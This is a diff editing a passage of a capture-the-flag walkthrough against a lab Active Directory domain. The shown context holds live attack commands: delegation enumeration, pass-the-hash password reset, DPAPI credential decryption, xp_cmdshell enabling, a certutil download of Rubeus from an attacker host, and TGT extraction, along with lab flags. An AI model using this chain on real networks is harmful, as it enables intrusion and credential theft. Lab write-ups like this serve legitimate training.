@@ -368,8 +368,7 @@ The delegation enumeration is the one that tells us what's already permitted in 
 ➜ nxc ldap blackpearl.pirates.brb \
     -u 'morgan' -p 'Entry369@!*' --find-delegation
 
-LDAP        192.168.10.10   389    BLACKPEARL       [*] Windows Server 2022 Build 2022 Build 20348 (name:BLACKPEARL) (domain:PIRATES.BRB) (signing:None) (channel binding:No TLS cert)
-LDAP        192.168.10.10   389    BLACKPEARL       [+] PIRATES.BRB\morgan:Entry369@!*
+...[snip]...
 LDAP        192.168.10.10   389    BLACKPEARL       AccountName AccountType DelegationType DelegationRightsTo
 LDAP        192.168.10.10   389    BLACKPEARL       ----------- ----------- -------------- -------------------------------
 LDAP        192.168.10.10   389    BLACKPEARL       QUEENREV$   Computer    Constrained    host/FLYINGDUTCHMAN.PIRATES.BRB
@@ -474,9 +473,8 @@ We already hold `morgan`'s TGT somewhere earlier in the session — the notes do
 ➜ nxc smb blackpearl.pirates.brb \
     -u 'morgan' -H '52bb96aecbcfe774799a60da76212a54' \
     -M change-password -o NEWNTHASH='b03b513de8ffc8ed466601a40f0fb044'
-SMB         192.168.10.10   445    BLACKPEARL       [*] Windows Server 2022 Build 20348 x64 (name:BLACKPEARL) (domain:PIRATES.BRB) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
-SMB         192.168.10.10   445    BLACKPEARL       [+] PIRATES.BRB\morgan:52bb96aecbcfe774799a60da76212a54
-CHANGE-P... 192.168.10.10   445    BLACKPEARL       Note: Target user must change password at next logon.
+
+...[snip]...
 CHANGE-P... 192.168.10.10   445    BLACKPEARL       [+] Successfully changed password for morgan
 ```
 
@@ -572,6 +570,7 @@ PS > !download "C:\Users\pirate1\AppData\Roaming\Microsoft\Credentials\82D585BFB
 
 ➜ dpapi.py credential -file "82D585BFBAA099ADDEA463533658FDBA" \
     -ck b7f909dbfe450c597454fcdb6775a988662e0446
+
 [*] Target: LegacyGeneric:target=smb.queenrev
 [*] User: ironhook
 [*] Password: brb{5d26ec0024167fdf8a45a70eff4ade36}
@@ -666,7 +665,7 @@ MSSQL       192.168.10.12   1433   QUEENREV         name:Golden Skull Atoll
 MSSQL       192.168.10.12   1433   QUEENREV         comment:brb{c37c5303024c911bb23a759d0f4cad75}
 ```
 
-That's the database flag. But the SQL shell isn't the prize — the pivot to the host is. The MSSQL service on `QUEENREV` runs under `nt service\mssql$sqlexpress`, and that service account has `SeImpersonatePrivilege` and the other privileges that make `xp_cmdshell` work. Enable it from inside the `sa` context, and the SQL server can run arbitrary OS commands as the service account:
+That's the sixth flag, pulled straight from the database. But the SQL shell isn't the prize — the pivot to the host is. The MSSQL service on `QUEENREV` runs under `nt service\mssql$sqlexpress`, and that service account has `SeImpersonatePrivilege` and the other privileges that make `xp_cmdshell` work. Enable it from inside the `sa` context, and the SQL server can run arbitrary OS commands as the service account:
 
 ```zsh
 ➜ nxc mssql queenrev.pirates.brb \
@@ -738,7 +737,6 @@ That's the OS flag on `QUEENREV`. The potato climbed the privilege ladder from a
 The final move before the ghost ship is the `QUEENREV$` TGT. SYSTEM owns the Kerberos ticket cache locally, and Rubeus can harvest it from the running session. The `triage` command shows what's in the cache, and the `tgtdeleg` command extracts a delegation-capable TGT for `QUEENREV$`:
 
 ```powershell
-PS > cd /programdata
 PS > certutil -urlcache -f -split http://192.168.10.131/Rubeus.exe Rubeus.exe
 
 PS > .\rubeus.exe tgtdeleg /nowrap
